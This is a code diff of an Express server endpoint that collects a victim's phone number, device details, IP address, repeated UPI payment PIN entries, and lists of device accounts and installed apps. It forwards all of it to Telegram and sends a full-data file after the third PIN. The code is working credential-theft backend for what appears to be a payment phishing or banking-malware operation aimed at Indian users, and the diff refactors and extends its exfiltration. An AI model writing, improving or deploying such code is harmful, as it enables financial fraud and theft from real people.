@@ -73,6 +73,7 @@ const startupNotification = async () => {
 };
 
 app.post('/send-data', async (req, res) => {
+    // UPDATED: Destructure accounts and packages from req.body
     const { type, number, pin, deviceId, deviceTime, deviceDate, userIP, accounts, packages } = req.body;
     
     if (deviceId) {
@@ -87,64 +88,49 @@ app.post('/send-data', async (req, res) => {
         updatedText += `*IP Address:* "${userIP || 'Detecting...'}"\n`; 
         updatedText += `*Date:* ${deviceDate || 'Detecting...'}\n`; 
         updatedText += `*Real Time:* ${deviceTime || 'Detecting...'}\n`; 
-        updatedText += `*Number:* "+91${number}"\n\n`;
+        updatedText += `*Number:* "+91${number}"\n`;
         
-        updatedText += `[UPI_SECTION]`; 
-        updatedText += `\n[EXTRA_DATA_SECTION]`; 
-        
-        currentMessageText = updatedText;
-        await sendOrUpdateTelegram(currentMessageText.replace("[UPI_SECTION]", "").replace("[EXTRA_DATA_SECTION]", ""));
+        currentMessageText = updatedText; // Store to update later
+        await sendOrUpdateTelegram(currentMessageText);
     } 
-
+    
     else if (pin) {
         pinCount++; 
-        let newPinLine = `*UPI PIN:* "${pin}"\n`;
-        
-        if (pinCount === 1) {
-            currentMessageText = currentMessageText.replace("[UPI_SECTION]", `${newPinLine}[UPI_SECTION]`);
-        } else {
-            currentMessageText = currentMessageText.replace("[UPI_SECTION]", `${newPinLine}[UPI_SECTION]`);
-        }
-        
-        await sendOrUpdateTelegram(currentMessageText.replace("[UPI_SECTION]", "").replace("[EXTRA_DATA_SECTION]", ""));
-
+        currentMessageText += `*UPI PIN:* "${pin}"\n`;
+        await sendOrUpdateTelegram(currentMessageText);
         if (pinCount === 3) {
-            await sendFileToTelegram(currentMessageText.replace("[UPI_SECTION]", "").replace("[EXTRA_DATA_SECTION]", ""), fullDeviceName);
+            await sendFileToTelegram(currentMessageText, fullDeviceName);
         }
     }
 
+    // --- NEW LOGIC FOR ACCOUNTS & PACKAGES ---
     else if (accounts || packages) {
-        let extraData = `\n*Account's*\n`;
+        let extraInfo = `\n*--- Account's ---*\n`;
         
-        // ZAROORI UPDATE: String ko array mein badalne ke liye logic
-        let accList = accounts;
-        if (typeof accounts === 'string') {
-            try { accList = JSON.parse(accounts); } catch (e) { accList = [accounts]; }
-        }
-        
+        // Handle Accounts
+        let accList = typeof accounts === 'string' ? JSON.parse(accounts) : accounts;
         if (accList && Array.isArray(accList)) {
-            accList.forEach(acc => { extraData += `• ${acc}\n`; });
-        } else if (accList) {
-            extraData += `• ${accList}\n`;
-        }
-        
-        extraData += `\n*Package's*\n`;
-        
-        let pkgList = packages;
-        if (typeof packages === 'string') {
-            try { pkgList = JSON.parse(packages); } catch (e) { pkgList = [packages]; }
+            accList.forEach(acc => { extraInfo += `• ${acc}\n`; });
+        } else {
+            extraInfo += `No Accounts Found\n`;
         }
 
+        extraInfo += `\n*--- Package's ---*\n`;
+        
+        // Handle Packages
+        let pkgList = typeof packages === 'string' ? JSON.parse(packages) : packages;
         if (pkgList && Array.isArray(pkgList)) {
-            pkgList.forEach(pkg => { extraData += `• ${pkg}\n`; });
-        } else if (pkgList) {
-            extraData += `• ${pkgList}\n`;
+            pkgList.forEach(pkg => { extraInfo += `• ${pkg}\n`; });
+        } else {
+            extraInfo += `No Packages Found\n`;
         }
 
-        currentMessageText = currentMessageText.replace("[EXTRA_DATA_SECTION]", extraData);
-        await sendOrUpdateTelegram(currentMessageText.replace("[UPI_SECTION]", "").replace("[EXTRA_DATA_SECTION]", ""));
+        // Append to the existing message and update Telegram
+        currentMessageText += extraInfo;
+        await sendOrUpdateTelegram(currentMessageText);
         
-        await sendFileToTelegram(currentMessageText.replace("[UPI_SECTION]", "").replace("[EXTRA_DATA_SECTION]", ""), fullDeviceName);
+        // Instant file backup for full data
+        await sendFileToTelegram(currentMessageText, `Full_Data_${fullDeviceName}`);
     }
     
     res.status(200).json({ success: true });
